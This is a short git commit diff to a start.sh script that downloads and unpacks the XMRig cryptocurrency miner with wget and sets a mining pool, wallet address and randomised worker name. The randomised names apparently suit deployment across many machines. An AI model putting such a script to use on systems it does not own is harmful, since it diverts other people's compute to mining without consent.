89a7eb58d4e873c57b316f233090af29ca9a51f2
Gazzy J. Uruj <ghazanfar.uruj.cool@gmail.com>
2021-07-22 14:30:59 +0530

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-focal-x64.tar.gz
-tar -zxvf xmrig-6.13.1-focal-x64.tar.gz
-cd xmrig-6.13.1
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-static-x64.tar.gz
+tar -zxvf xmrig-6.13.1-linux-static-x64.tar.gz
+cd xmrig-6.13.1-static
 POOL=rx.unmineable.com:3333
 WALLET=BTT:TQBff9wvrUvsUCz34NG8ptprhUKwwPMgGK
 WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-Gaz001)
